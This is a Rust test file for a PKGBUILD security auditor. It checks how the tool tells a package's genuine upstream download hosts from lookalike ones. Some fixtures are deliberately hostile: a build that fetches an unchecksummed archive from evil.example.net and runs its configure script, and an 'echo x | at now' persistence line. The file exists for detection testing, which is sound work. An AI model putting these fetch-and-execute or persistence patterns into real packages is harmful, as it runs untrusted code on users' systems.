// SPDX-License-Identifier: GPL-2.0-or-later
//! Causes of false flags, each with the hostile twin that must stay flagged.
use aurlaws::{audit_text, hosts};

fn names(n: &str) -> Vec<String> {
    vec![n.to_owned()]
}

fn laws(pkgbuild: &str) -> Vec<String> {
    audit_text(pkgbuild, None)
        .findings
        .iter()
        .map(|f| format!("{:?}", f.law))
        .collect()
}

#[test]
fn a_projects_own_addresses_are_on_upstream() {
    let on = hosts::on_upstream;
    let n = names("osu-lazer-bin");
    assert!(on(
        "https://osu.ppy.sh",
        "https://github.com/ppy/osu/releases/download/1/a",
        &n,
        true
    ));
    let n = names("lib32-libvpx");
    assert!(on(
        "https://www.webmproject.org/",
        "git+https://chromium.googlesource.com/webm/libvpx#tag=1",
        &n,
        true
    ));
    let n = names("whatsdesk-bin");
    assert!(on(
        "https://gitlab.com/zerkc/whatsdesk/",
        "https://zerkc.gitlab.io/whatsdesk/a.deb",
        &n,
        true
    ));
    let n = names("llama.cpp-vulkan-git");
    assert!(on(
        "https://github.com/ggerganov/llama.cpp",
        "git+https://github.com/ggml-org/llama.cpp.git",
        &n,
        false
    ));
    let n = names("nordvpn-gui");
    assert!(on(
        "https://nordvpn.com",
        "https://github.com/NordSecurity/nordvpn-linux/archive/1.tar.gz",
        &n,
        true
    ));
}

#[test]
fn a_stranger_stays_off_upstream() {
    let on = hosts::on_upstream;
    let n = names("whatsdesk-bin");
    assert!(!on(
        "https://gitlab.com/zerkc/whatsdesk/",
        "https://stranger.gitlab.io/whatsdesk/a.deb",
        &n,
        true
    ));
    assert!(!on(
        "https://gitlab.com/zerkc/whatsdesk/",
        "https://github.com/stranger/payload/a.deb",
        &n,
        true
    ));
    let n = names("nordvpn-gui");
    assert!(!on(
        "https://nordvpn.com",
        "https://github.com/NordSecurity/nordvpn-linux/archive/1.tar.gz",
        &n,
        false
    ));
    assert!(!on(
        "https://osu.ppy.sh",
        "https://github.com/ppyy/osu2/a",
        &names("osu-lazer-bin"),
        true
    ));
}

#[test]
fn a_submodule_upstream_lists_is_upstream() {
    let list = vec!["https://github.com/google/googletest.git".to_owned()];
    assert!(hosts::named_by_upstream(
        &list,
        "git+https://github.com/google/googletest.git#commit=1"
    ));
    assert!(!hosts::named_by_upstream(
        &list,
        "git+https://github.com/stranger/googletest.git"
    ));
}

const HEAD: &str = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org/demo\n";

#[test]
fn an_on_upstream_https_archive_is_trusted_like_a_git_source() {
    let good = format!(
        "{HEAD}source=(a.tar.gz::https://example.org/a.tar.gz)\nsha256sums=(SKIP)\nbuild() {{\n  cd a\n  ./configure\n}}\n"
    );
    assert!(
        !laws(&good).iter().any(|l| l.contains("FetchExecute")),
        "{:?}",
        laws(&good)
    );
    let bad = format!(
        "{HEAD}source=(a.tar.gz::https://evil.example.net/a.tar.gz)\nsha256sums=(SKIP)\nbuild() {{\n  cd a\n  ./configure\n}}\n"
    );
    assert!(
        laws(&bad).iter().any(|l| l.contains("FetchExecute")),
        "{:?}",
        laws(&bad)
    );
}

#[test]
fn at_is_a_scheduler_only_with_a_time() {
    let word = format!("{HEAD}source=()\nbuild() {{\n  at the end of the file\n}}\n");
    assert!(laws(&word).is_empty(), "{:?}", laws(&word));
    let real = format!("{HEAD}source=()\nbuild() {{\n  echo x | at now\n}}\n");
    assert!(
        laws(&real).iter().any(|l| l.contains("Persistence")),
        "{:?}",
        laws(&real)
    );
}
